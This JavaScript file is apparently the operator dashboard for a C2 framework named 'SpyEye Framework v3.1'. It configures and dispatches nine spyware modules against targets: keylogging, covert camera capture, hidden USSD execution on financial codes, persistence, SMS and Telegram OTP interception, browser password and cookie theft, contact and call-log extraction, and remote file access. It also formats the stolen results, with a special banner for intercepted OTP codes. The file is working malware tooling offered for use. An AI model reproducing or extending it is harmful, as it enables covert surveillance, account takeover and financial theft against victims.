/**
 * static/js/script.js
 * 
 * Advanced C2 Master Controller Client Script for SpyEye Framework v3.1.
 * Handles real-time WebSocket socketio telemetry streaming, dynamic target management,
 * professional modal configuration dialogs, and interactive command dispatching.
 */

const socket = io();

// Global state management
let autoScrollEnabled = true;
let currentConfigModule = null;

// Module configuration schema definitions for professional modal parameter injection
const moduleSchemas = {
    keylogger: {
        title: "Keylogger Module Configuration",
        description: "Captures and exfiltrates real-time keystrokes and sensitive text inputs.",
        fields: [
            { name: "buffer_size", label: "Buffer Size (lines)", type: "number", default: 50 },
            { name: "stealth_mode", label: "Enable Stealth Hook", type: "checkbox", default: true }
        ]
    },
    camera: {
        title: "Remote Camera Capture Configuration",
        description: "Stream live camera feed or capture snapshot images from target devices.",
        fields: [
            { name: "camera_id", label: "Camera Device Index (0 = Rear/Webcam, 1 = Front)", type: "number", default: 0 },
            { name: "mode", label: "Operation Mode", type: "select", options: ["snapshot", "stream"], default: "snapshot" },
            { name: "quality", label: "Image Quality (1-100)", type: "number", default: 85 }
        ]
    },
    ussd: {
        title: "Interactive USSD Executor Configuration",
        description: "Execute hidden financial or carrier USSD strings with live session management.",
        fields: [
            { name: "ussd_code", label: "Target USSD Code (e.g., *841#)", type: "text", default: "*841#" },
            { name: "timeout", label: "Session Timeout (seconds)", type: "number", default: 45 }
        ]
    },
    persistence: {
        title: "System Persistence Engine Configuration",
        description: "Establish automated autostart and resurrection vectors across operating systems.",
        fields: [
            { name: "technique", label: "Persistence Technique", type: "select", options: ["all", "registry", "startup", "scheduled_task", "crontab", "systemd", "xdg_autostart"], default: "all" },
            { name: "service_name", label: "Service / Task Name", type: "text", default: "SpyEyeService" },
            { name: "interval_minutes", label: "Health-check Interval (min)", type: "number", default: 60 }
        ]
    },
    sms_interceptor: {
        title: "SMS & Telegram OTP Interceptor Configuration",
        description: "Monitor and isolate high-value authentication notifications and Telegram login codes.",
        fields: [
            { name: "target_app", label: "Target Package Filter", type: "text", default: "org.telegram.messenger" },
            { name: "mode", label: "Interception Vector", type: "select", options: ["both", "sms", "notifications"], default: "both" }
        ]
    },
    device_info: {
        title: "Device Fingerprinting Configuration",
        description: "Extract comprehensive OS architecture, hardware specs, network interfaces, and location metadata.",
        fields: [
            { name: "deep_scan", label: "Perform Deep Storage Enumeration", type: "checkbox", default: true }
        ]
    },
    browser_stealer: {
        title: "Browser Credential Stealer Configuration",
        description: "Exfiltrate saved passwords, session cookies, and browsing history from supported browsers.",
        fields: [
            { name: "browsers", label: "Target Browsers", type: "text", default: "Chrome,Firefox,Edge" },
            { name: "include_cookies", label: "Extract Active Session Cookies", type: "checkbox", default: true }
        ]
    },
    call_contacts: {
        title: "Call Logs & Contacts Extraction Configuration",
        description: "Extract full device contact address book and historical call logs.",
        fields: [
            { name: "export_format", label: "Export Format", type: "select", options: ["json", "csv"], default: "json" }
        ]
    },
    file_manager: {
        title: "Remote File Manager Configuration",
        description: "Browse, upload, and download target file system directory structures.",
        fields: [
            { name: "root_path", label: "Target Root Directory (leave blank for default)", type: "text", default: "" }
        ]
    }
};

// ─── WebSocket Event Listeners ────────────────────────────────────────

socket.on('connect', () => {
    console.log('[*] Connected to SpyEye C2 Server via WebSocket.');
    appendLog('system', 'Secure connection successfully established with C2 master controller.');
    updateServerStatus(true);
});

socket.on('disconnect', () => {
    appendLog('error', 'WARNING: Connection to C2 server lost! Attempting reconnection...');
    updateServerStatus(false);
});

// Dynamic listeners for all 9 registered modules
const modulesList = [
    'keylogger', 'camera', 'ussd', 'persistence', 
    'sms_interceptor', 'device_info', 'browser_stealer', 
    'call_contacts', 'file_manager'
];

modulesList.forEach(mod => {
    socket.on(`${mod}_response`, (data) => {
        handleModuleTelemetry(mod, data);
    });
});

// ─── Target & Workspace Logic ─────────────────────────────────────────

function getActiveTargetId() {
    const activeItem = document.querySelector('.target-item.active');
    return activeItem ? activeItem.getAttribute('data-targetid') : 'target_default_01';
}

function selectTarget(targetId, element) {
    document.querySelectorAll('.target-item').forEach(item => item.classList.remove('active'));
    element.classList.add('active');
    appendLog('info', `Switched active target context to: [${targetId}]`);
}

function filterTargets() {
    const query = document.getElementById('target-search').value.toLowerCase();
    document.querySelectorAll('.target-item').forEach(item => {
        const name = item.querySelector('.target-name').textContent.toLowerCase();
        const id = item.querySelector('.target-id').textContent.toLowerCase();
        if (name.includes(query) || id.includes(query)) {
            item.style.display = 'flex';
        } else {
            item.style.display = 'none';
        }
    });
}

function updateServerStatus(isOnline) {
    const statusText = document.getElementById('server-status-text');
    const indicator = document.querySelector('.status-indicator');
    if (isOnline) {
        statusText.textContent = 'ONLINE';
        indicator.className = 'status-indicator online';
    } else {
        statusText.textContent = 'OFFLINE';
        indicator.className = 'status-indicator offline';
    }
}

// ─── Modal Configuration & Execution Engine ───────────────────────────

function openModuleConfig(moduleName) {
    currentConfigModule = moduleName;
    const schema = moduleSchemas[moduleName];
    if (!schema) return;

    document.getElementById('modal-title').innerHTML = `<i class="fa-solid fa-sliders"></i> ${schema.title}`;
    
    let htmlContent = `<p class="modal-desc">${schema.description}</p><div class="config-form">`;
    
    schema.fields.forEach(field => {
        htmlContent += `<div class="form-group"><label>${field.label}</label>`;
        if (field.type === 'select') {
            htmlContent += `<select id="cfg_${field.name}" class="form-control">`;
            field.options.forEach(opt => {
                const selected = opt === field.default ? 'selected' : '';
                htmlContent += `<option value="${opt}" ${selected}>${opt}</option>`;
            });
            htmlContent += `</select>`;
        } else if (field.type === 'checkbox') {
            const checked = field.default ? 'checked' : '';
            htmlContent += `<input type="checkbox" id="cfg_${field.name}" class="form-checkbox" ${checked}>`;
        } else if (field.type === 'number') {
            htmlContent += `<input type="number" id="cfg_${field.name}" class="form-control" value="${field.default}">`;
        } else {
            htmlContent += `<input type="text" id="cfg_${field.name}" class="form-control" value="${field.default}">`;
        }
        htmlContent += `</div>`;
    });
    
    htmlContent += `</div>`;
    document.getElementById('modal-body-content').innerHTML = htmlContent;
    document.getElementById('module-modal').style.display = 'flex';
}

function closeModuleModal() {
    document.getElementById('module-modal').style.display = 'none';
    currentConfigModule = null;
}

function executeConfiguredModule() {
    if (!currentConfigModule) return;
    const schema = moduleSchemas[currentConfigModule];
    const targetId = getActiveTargetId();
    const configParams = {};

    schema.fields.forEach(field => {
        const el = document.getElementById(`cfg_${field.name}`);
        if (el) {
            if (field.type === 'checkbox') {
                configParams[field.name] = el.checked;
            } else if (field.type === 'number') {
                configParams[field.name] = Number(el.value);
            } else {
                configParams[field.name] = el.value;
            }
        }
    });

    appendLog('command', `Dispatching [${currentConfigModule}] payload to target [${targetId}] with parameters...`);
    
    // Emit corresponding WebSocket socket event to the backend server controller
    socket.emit(`start_${currentConfigModule}`, {
        target_id: targetId,
        config: configParams
    });

    closeModuleModal();
}

// ─── Telemetry Handling & Terminal Console ────────────────────────────

function handleModuleTelemetry(moduleName, data) {
    let logType = 'success';
    let formattedMsg = `[${moduleName.toUpperCase()}] -> ${JSON.stringify(data, null, 2)}`;

    // Special custom formatting for specific modules like USSD or SMS Interceptor
    if (moduleName === 'ussd' && data.data) {
        const ussdData = data.data;
        if (ussdData.screen_content) {
            formattedMsg = `\n--- USSD SESSION [${ussdData.session_id || 'ACTIVE'}] (Step ${ussdData.step || 1}) ---\n`;
            formattedMsg += `${ussdData.screen_content}\n`;
            if (ussdData.requires_input) {
                logType = 'warning';
                formattedMsg += `[!] Status: Waiting for user command input...`;
            } else {
                formattedMsg += `[✓] Status: Session concluded.`;
            }
        }
    } else if (moduleName === 'sms_interceptor' && data.data) {
        const sms = data.data;
        logType = 'warning';
        formattedMsg = `\n🚨 HIGH-VALUE OTP INTERCEPTED 🚨\nSource: ${sms.source.toUpperCase()} | App/Sender: ${sms.package || sms.sender}\nExtracted OTP Code: [ ${sms.otp_code || 'N/A'} ]\nMessage: ${sms.message_body}\n`;
    }

    appendLog(logType, formattedMsg);
}

function appendLog(type, message) {
    const terminal = document.getElementById('terminal-output');
    const entry = document.createElement('div');
    entry.className = `log-entry ${type}`;
    
    const timestamp = new Date().toLocaleTimeString();
    entry.innerHTML = `<span class="log-time">[${timestamp}]</span> <span class="log-content">${escapeHtml(message)}</span>`;
    
    terminal.appendChild(entry);
    
    if (autoScrollEnabled) {
        terminal.scrollTop = terminal.scrollHeight;
    }
}

function toggleAutoScroll() {
    autoScrollEnabled = !autoScrollEnabled;
    const btn = document.getElementById('autoscroll-toggle');
    if (autoScrollEnabled) {
        btn.innerHTML = '<i class="fa-solid fa-lock"></i> Auto';
        btn.style.borderColor = 'var(--accent-green)';
    } else {
        btn.innerHTML = '<i class="fa-solid fa-lock-open"></i> Manual';
        btn.style.borderColor = '#777';
    }
}

function clearTerminal() {
    document.getElementById('terminal-output').innerHTML = '';
    appendLog('info', 'Terminal output buffer cleared by operator.');
}

function exportTerminalLogs() {
    const terminal = document.getElementById('terminal-output');
    const textContent = terminal.innerText;
    const blob = new Blob([textContent], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `spyeye_telemetry_${Date.now()}.txt`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
}

function escapeHtml(text) {
    const map = {
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#039;'
    };
    return text.replace(/[&<>"']/g, function(m) { return map[m]; });
}